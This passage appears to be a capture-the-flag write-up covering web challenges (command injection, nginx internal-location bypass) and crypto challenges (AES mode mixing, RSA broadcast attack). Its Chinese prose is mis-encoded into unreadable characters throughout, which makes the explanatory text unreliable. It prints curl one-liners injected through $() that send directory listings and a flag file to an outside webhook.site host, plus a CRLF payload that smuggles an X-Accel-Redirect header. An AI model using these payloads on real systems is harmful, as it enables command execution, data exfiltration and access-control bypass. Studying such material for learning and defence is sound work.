<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span>(<span class="string">&quot;host &#123;$_POST[&#x27;name&#x27;]&#125;&quot;</span>, $output, $retcode);</span><br></pre></td></tr></table></figure>
<p>æˆ‘æ‰¾åˆ°ä¸€å€‹å«åš<code>$()</code>å¯ä»¥åŸ·è¡Œcommand<br>æ‰€ä»¥æˆ‘æ§‹é€ äº†payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(curl https://webhook.site/33c6a830-fd48-4997-a9e3-6f9f7f82877d -X POST -d &quot;$(ls /)&quot;)</span><br></pre></td></tr></table></figure>
<p>ç”¨webhookä¾†æ”¶æ ¹ç›®éŒ„åº•ä¸‹æœ‰å•¥<br>æœ€å¾Œç›´æ¥cat flag(flagè¢«éæ¿¾ç›´æ¥ç”¨<code>&#39;</code>å°±å¯ä»¥äº†)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(curl https://webhook.site/33c6a830-fd48-4997-a9e3-6f9f7f82877d -X POST -d &quot;$(cat /f&#x27;l&#x27;ag_uPa6TE7GaQ4m9RiV)&quot;)</span><br></pre></td></tr></table></figure>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/SyDitMO_T.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyDitMO_T.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="Internal"><a href="#Internal" class="headerlink" title="Internal"></a>Internal</h2><p>é€™é¡Œæœ‰å¤ å¥½ç©!<br>server</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> ThreadingHTTPServer, BaseHTTPRequestHandler</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse, parse_qs</span><br><span class="line"><span class="keyword">import</span> re, os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;/flag&quot;</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;/flag&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        FLAG = f.read().strip()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    FLAG = os.environ.get(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;flag&#123;this_is_a_fake_flag&#125;&quot;</span>)</span><br><span class="line">URL_REGEX = re.<span class="built_in">compile</span>(<span class="string">r&quot;https?://[a-zA-Z0-9.]+(/[a-zA-Z0-9./?#]*)?&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RequestHandler</span>(<span class="title class_ inherited__">BaseHTTPRequestHandler</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">do_GET</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">if</span> self.path == <span class="string">&quot;/flag&quot;</span>:</span><br><span class="line">            self.send_response(<span class="number">200</span>)</span><br><span class="line">            self.end_headers()</span><br><span class="line">            self.wfile.write(FLAG.encode())</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        query = parse_qs(urlparse(self.path).query)</span><br><span class="line">        redir = <span class="literal">None</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;redir&quot;</span> <span class="keyword">in</span> query:</span><br><span class="line">            redir = query[<span class="string">&quot;redir&quot;</span>][<span class="number">0</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> URL_REGEX.<span class="keyword">match</span>(redir):</span><br><span class="line">                redir = <span class="literal">None</span></span><br><span class="line">        self.send_response(<span class="number">302</span> <span class="keyword">if</span> redir <span class="keyword">else</span> <span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> redir:</span><br><span class="line">            self.send_header(<span class="string">&quot;Location&quot;</span>, redir)</span><br><span class="line">        self.end_headers()</span><br><span class="line">        self.wfile.write(<span class="string">b&quot;Hello world!&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    server = ThreadingHTTPServer((<span class="string">&quot;&quot;</span>, <span class="number">7777</span>), RequestHandler)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Starting server, use &lt;Ctrl-C&gt; to stop&quot;</span>)</span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>nginx conf</p>
<figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">server</span> &#123;</span><br><span class="line">    <span class="attribute">listen</span>       <span class="number">7778</span>;</span><br><span class="line">    <span class="attribute">listen</span>  [::]:<span class="number">7778</span>;</span><br><span class="line">    <span class="attribute">server_name</span>  localhost;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> /flag &#123;</span><br><span class="line">        internal;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://web:7777;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="section">location</span> / &#123;</span><br><span class="line">        <span class="attribute">proxy_pass</span> http://web:7777;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ä¸€å€‹http server<br>å‡å¦‚ä½ ç›´æ¥è¨ªå•&#x2F;flagï¼Œæœƒå› ç‚ºnginxè¨­å®š<code>internal</code>ï¼Œå ±404ï¼Œæ‰€ä»¥åªèƒ½é€énginxå…§éƒ¨ä¾†è¨ªå•ï¼Œå‡å¦‚å¯ä»¥ç”¨nginxå…§éƒ¨ä¾†è¨ªå•ï¼Œé‚£ä»–æœƒç”¨<code>http://web:7777</code> ä¾†ä»£ç†è¨ªå•<br>æ€éº¼ç”¨å…§éƒ¨è¨ªå•å¯ä»¥åƒè€ƒ<br><a target="_blank" rel="noopener" href="https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/">https://www.nginx.com/resources/wiki/start/topics/examples/x-accel/</a><br><code>X-Accel-Redirect</code> å¦‚æœåœ¨ä½ è¨ªå•çš„response headerå°±æœƒé€énginxå…§éƒ¨ä¾†é‡æ–°å°å‘ï¼Œæ‰€ä»¥å°±ç›´æ¥ç”¨<code>%0d%0a</code>ä¾†å¡é€²response header<br>æœ€å¾Œæ§‹é€ å‡º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redir=https://www.pixiv.net/%0d%0aX-Accel-Redirect:/flag</span><br></pre></td></tr></table></figure>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/HkA79zOd6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HkA79zOd6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Baby-AES"><a href="#Baby-AES" class="headerlink" title="Baby AES"></a>Baby AES</h2><p>server</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes <span class="keyword">as</span> l2b, bytes_to_long <span class="keyword">as</span> b2l</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> urandom</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64encode, b64decode</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">XOR</span> (a, b):</span><br><span class="line">    <span class="keyword">return</span> l2b(b2l(a) ^ b2l(b)).rjust(<span class="built_in">len</span>(a), <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">counter_add</span>(<span class="params">iv</span>):</span><br><span class="line">    <span class="keyword">return</span> l2b(b2l(iv) + <span class="number">1</span>).rjust(<span class="number">16</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># These modes of Block Cipher are just like Stream Cipher. Do you know them?</span></span><br><span class="line">AES_enc = AES.new(urandom(<span class="number">16</span>), AES.MODE_ECB).encrypt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_CFB</span> (iv, pt):</span><br><span class="line">    ct = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        _ct = XOR(AES_enc(iv), pt[i : i + <span class="number">16</span>])</span><br><span class="line">        iv = _ct</span><br><span class="line">        ct += _ct</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_OFB</span> (iv, pt):</span><br><span class="line">    ct = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        iv = AES_enc(iv)</span><br><span class="line">        ct += XOR(iv, pt[i : i + <span class="number">16</span>])</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_CTR</span> (iv, pt):</span><br><span class="line">    ct = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(pt), <span class="number">16</span>):</span><br><span class="line">        ct += XOR(AES_enc(iv), pt[i : i + <span class="number">16</span>])</span><br><span class="line">        iv = counter_add(iv)</span><br><span class="line">    <span class="keyword">return</span> ct</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    counter = urandom(<span class="number">16</span>)</span><br><span class="line">    c1 = urandom(<span class="number">32</span>)</span><br><span class="line">    c2 = urandom(<span class="number">32</span>)</span><br><span class="line">    c3 = XOR(XOR(c1, c2), FLAG)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">f&quot;c1_CFB: (<span class="subst">&#123;b64encode(counter)&#125;</span>, <span class="subst">&#123;b64encode(AES_CFB(counter, c1))&#125;</span>)&quot;</span> )</span><br><span class="line">    counter = counter_add(counter)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">f&quot;c2_OFB: (<span class="subst">&#123;b64encode(counter)&#125;</span>, <span class="subst">&#123;b64encode(AES_OFB(counter, c2))&#125;</span>)&quot;</span> )</span><br><span class="line">    counter = counter_add(counter)</span><br><span class="line">    <span class="built_in">print</span>( <span class="string">f&quot;c3_CTR: (<span class="subst">&#123;b64encode(counter)&#125;</span>, <span class="subst">&#123;b64encode(AES_CTR(counter, c3))&#125;</span>)&quot;</span> )</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            counter = counter_add(counter)</span><br><span class="line">            mode = <span class="built_in">input</span>(<span class="string">&quot;What operation mode do you want for encryption? &quot;</span>)</span><br><span class="line">            pt = b64decode(<span class="built_in">input</span>(<span class="string">&quot;What message do you want to encrypt (in base64)? &quot;</span>))</span><br><span class="line">            pt = pt.ljust( ((<span class="built_in">len</span>(pt) - <span class="number">1</span>) // <span class="number">16</span> + <span class="number">1</span>) * <span class="number">16</span>, <span class="string">b&quot;\x00&quot;</span>)</span><br><span class="line">            <span class="keyword">if</span> mode == <span class="string">&quot;CFB&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>( b64encode(counter), b64encode(AES_CFB(counter, pt)) )</span><br><span class="line">            <span class="keyword">elif</span> mode == <span class="string">&quot;OFB&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>( b64encode(counter), b64encode(AES_OFB(counter, pt)) )</span><br><span class="line">            <span class="keyword">elif</span> mode == <span class="string">&quot;CTR&quot;</span>:</span><br><span class="line">                <span class="built_in">print</span>( b64encode(counter), b64encode(AES_CTR(counter, pt)) )</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;Sorry, I don&#x27;t understand.&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;??&quot;</span>)</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<p>é€™é¡Œæœ‰çµ¦ä½ ä¸‰å€‹counterè·Ÿä¸‰å€‹å¯†æ–‡(CFBã€OFBã€CTR)<br>å¦å¤–ä»–çµ¦ä½ å¯ä»¥ä»»æ„å»é¸æ“‡ä½ è¦åšç”šéº¼åŠ å¯†çš„æ±æ±(å¯ä»¥åšäº”æ¬¡)ï¼Œæœ‰é»å°è¤‡é›œï¼ŒåŸæœ¬æˆ‘æƒ³èªªæŠŠæ‰€æœ‰å¯èƒ½æ€§ç®—ä¸€éå°±å¥½ï¼Œå¾Œä¾†é‚„æ˜¯èªçœŸç®—äº†ä¸€ä¸‹<br>è§€å¯Ÿä¸€ä¸‹<br><div class="img-item" data-src="https://hackmd.io/_uploads/HycbeQuda.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HycbeQuda.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br><div class="img-item" data-src="https://hackmd.io/_uploads/HkGwl7u_a.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/HkGwl7u_a.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>$C_1$ ç¼º $Counter1+E(Counter1)åŠ å¯†å‰åå…­byte$</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/SyKMemuu6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/SyKMemuu6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br><div class="img-item" data-src="https://hackmd.io/_uploads/S1CDgQ__a.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/S1CDgQ__a.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>$C_2$ ç¼º $E(Counter2)+E(E(Counter2))$</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/ByXXxQ_d6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/ByXXxQ_d6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br><div class="img-item" data-src="https://hackmd.io/_uploads/H18KlXd_p.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/H18KlXd_p.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div><br>$C_3$ ç¼º $E(Counter3)+E(Counter4)$</p>
<p>ç”¨CTR+CBFçš„bit-flipping attackä¾†è§£å°±å¯ä»¥äº†<br>ç¬¬ä¸€æ­¥<br>ä¸Ÿ<code>CTR</code>ï¼Œbâ€™\x00â€™</p>
<blockquote>
<p>å¾—åˆ° $E(Counter4)$</p>
</blockquote>
<p>ç¬¬äºŒæ­¥<br>ä¸Ÿ<code>CFB</code>ï¼Œ$E(Counter5)$^$Counter2$+bâ€™\x00â€™*32</p>
<blockquote>
<p>æ‹¿åˆ° $E(Counter2)+E(E(Counter2))$</p>
</blockquote>
<p>ç¬¬ä¸‰æ­¥<br>ä¸Ÿ<code>CFB</code>ï¼Œ$E(Counter6)$^$Counter3$+bâ€™\x00â€™*16</p>
<blockquote>
<p>æ‹¿åˆ° $E(Counter3)$</p>
</blockquote>
<p>ç¬¬å››æ­¥</p>
<p>ä¸Ÿ<code>CFB</code>ï¼Œ$E(Counter7)$^$Counter1$+bâ€™\x00â€™*16</p>
<blockquote>
<p>æ‹¿åˆ° $Counter1+E(Counter1)$</p>
</blockquote>
<p>ç¬¬äº”æ­¥<br>ä¸Ÿ<code>CFB</code>ï¼Œ$E(Counter8)$^$C_1$+bâ€™\x00â€™*16</p>
<blockquote>
<p>æ‹¿åˆ° $C_0$åŠ å¯†å‰å‰16bytes + $E(C_0åŠ å¯†å¾Œå‰16bytes$)</p>
</blockquote>
<p>æœ€å¾Œè§£é–‹$C_1ã€C_2ã€C_3$å¾Œxorä¸€ä¸‹ï¼Œå°±ç›´æ¥æ‹¿flag</p>
<p><div class="img-item" data-src="https://hackmd.io/_uploads/Hyuft7dO6.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/Hyuft7dO6.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<h2 id="Baby-RSA"><a href="#Baby-RSA" class="headerlink" title="Baby RSA"></a>Baby RSA</h2><p>server</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/python3</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, long_to_bytes, getPrime</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> FLAG</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">m, e, n</span>):</span><br><span class="line">    enc = <span class="built_in">pow</span>(bytes_to_long(m), e, n)</span><br><span class="line">    <span class="keyword">return</span> enc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">c, d, n</span>):</span><br><span class="line">    dec = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="keyword">return</span> long_to_bytes(dec)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(<span class="number">1024</span>)</span><br><span class="line">        q = getPrime(<span class="number">1024</span>)</span><br><span class="line">        n = p * q</span><br><span class="line">        phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">        e = <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> phi % e != <span class="number">0</span> : </span><br><span class="line">            d = <span class="built_in">pow</span>(e, -<span class="number">1</span>, phi)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;n=&#125;</span>, <span class="subst">&#123;e=&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;FLAG: &quot;</span>, encrypt(FLAG, e, n))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            c = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&quot;Any message for me?&quot;</span>))</span><br><span class="line">            m = decrypt(c, d, n)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;How beautiful the message is, it makes me want to destroy it .w.&quot;</span>)</span><br><span class="line">            new_m = long_to_bytes(bytes_to_long(m) ^ bytes_to_long(os.urandom(<span class="number">8</span>)))</span><br><span class="line">            <span class="built_in">print</span>( <span class="string">&quot;New Message: &quot;</span>, encrypt(new_m, e, n) )</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;?&quot;</span>)</span><br><span class="line">            exit()</span><br><span class="line">        </span><br></pre></td></tr></table></figure>
<p>å¡è¶…ä¹…æœ€å¾Œç™¼ç¾æœ€å¾Œé¢é€xorçš„æ ¹æœ¬å°±ä¸éœ€è¦<br>åªè¦ncä¸‰æ¬¡ï¼Œä½ å°±æœƒæ‹¿åˆ°ä¸‰çµ„$N$è·Ÿ$C$ï¼Œç›´æ¥broadcast attackå°±å¯ä»¥äº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">import</span> functools</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n0 = <span class="number">10316315391553788469709948412791562463550596565615204164472972828099047950466813471143123986387365552342464271223023912248958605360272806398489442699786035093131693425532908104988200983778017858899719310301977961318893899216204831413015071126853305937175728922384523755777884362986838660554142140985611028098623233945390065502775165076262456721814605345316368384014749733529954620844119698021412205275709942887117760239889162600139993280126075831930328374647895996386757243132554965639982927004139988915151257934124281151881038518021848561390957287189408904677710721251714203178765186521705675905481676056830206261401</span></span><br><span class="line">c0 = <span class="number">7242315589701399080632698908254893771759923699911402371763042741586223809370111267219090033964747871701813531651150281778542108095450097193676365854238186752689769050514594441496948700025645487384065474297370311910784350554887106493778688050692577520540314293316178760087647028075487940589385949830360252965224306608756971707136237680442221158524631878531527672335465880482536158754913129939391995454596086523445870801149618772334122890653872989749644100894513635143919617002349065060533221323933428579177619355912765462446254812310419694654140542243422604511204522320220097147029715126657356591161079939493282600471</span></span><br><span class="line">n1 =<span class="number">14435449071988696459208381153497320330794550181340228167041842431418045105445237130722967745591980889913586122448164168696571327645230906439628612004758034493688294356523460824338678223234742730815718736876627387317708692550712047353745942134251580687692862942620039264232657194372937310771847896571205404339434216935504833648243279346271487186746795503198091313362543185792278843333795728136979569867389389257918917622528494178844537329893319068117693479912007846769972170430048141279162802430140636137549989418136937277812828775927883901708864647560240806626307848633826325838219039562144357872293976730314104104381</span></span><br><span class="line">c1 = <span class="number">2967452224156416166688229982982271853884662786831016540899450614788580313608527251590088294609966622439693845762390441186794075803176948874516911273812965612571759072430137977862062188482091031459374233406317696642200389677358871335797089423928662020661164693420306761296313564160782421166944941189045121826600925623949513636874004739753219124972089303870366863372759152839554397917022701297331947295101862591321148869825679334602387008604263704477253590048626464067353839698702272443725279919647284492529202007860254365279068016346975840505695590242575768559024525282279389057012544170327419580192168533481380196724</span></span><br><span class="line">n2 = <span class="number">14502031403044258642872388132630860484235689280447307939362645277356315793262094193765451740096583857519321045745560190040141172481282811548549927241200302800234605140723632737502299229538796521737697963834760133997453746060181285554331241561373088643630363010826263926300785580487794076965939790123370496028800897791243536000678241870885991913894951661171144343977051699314512196304641005136231209787783149256345828948599442683780117732139507918027733674876937855084004540880691600293780143509285690802356679648590851520438969678019678852837688238570252804447380129580081921055804464191039869020864032879496063338743</span></span><br><span class="line">c2 = <span class="number">12723035120523468133588008745804775998334959339477050906522329821448953047522680390230825266470958496391335553271465658836595551358612918501508241421451846454227354889175048179216246473783436052435576608824788609123754288594701748571564181175563863309794168503050763928297179931636055760563927000841255731653930727003108608743588138454970503810757334553757438627578305235453408631752702637995545634862917398529651989633362873056449286938030447035324480700836431263938165942018517926616024121287618718680458463407237190313971701048951553614509475271241789859042540362126822746114119985054446634125327663292126896470326</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">crt</span>(<span class="params">a, m</span>):</span><br><span class="line"></span><br><span class="line">    prod, total = functools.reduce(<span class="keyword">lambda</span> x, y: x * y, m), <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> ai, mi <span class="keyword">in</span> <span class="built_in">zip</span>(a, m):</span><br><span class="line">        Mi = prod // mi</span><br><span class="line">        total += ai * Mi * (gmpy2.gcdext(Mi, mi)[<span class="number">1</span>] % mi)</span><br><span class="line">    <span class="keyword">return</span> total % prod</span><br><span class="line"></span><br><span class="line">c = crt([c0, c1, c2], [n0, n1, n2])</span><br><span class="line">m, _ = gmpy2.iroot(c, <span class="number">3</span>)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>

<p><div class="img-item" data-src="https://hackmd.io/_uploads/rJkHjzOup.png" data-sub-html=".caption"><img src="https://hackmd.io/_uploads/rJkHjzOup.png" alt="image"><div class="img-caption d-block text-center"><span class="center-caption text-muted border-bottom">image</span></div></div></p>
<p>ä¸éè½èªªå¥½åƒæ˜¯å‡ºçˆ›äº†ï¼ŒåŸæœ¬ä¸æ˜¯è¦broadcast attackã€‚</p>
<h2 id="Baby-ECDLP"><a href="#Baby-ECDLP" class="headerlink" title="Baby ECDLP"></a>Baby ECDLP</h2><p>server</p>
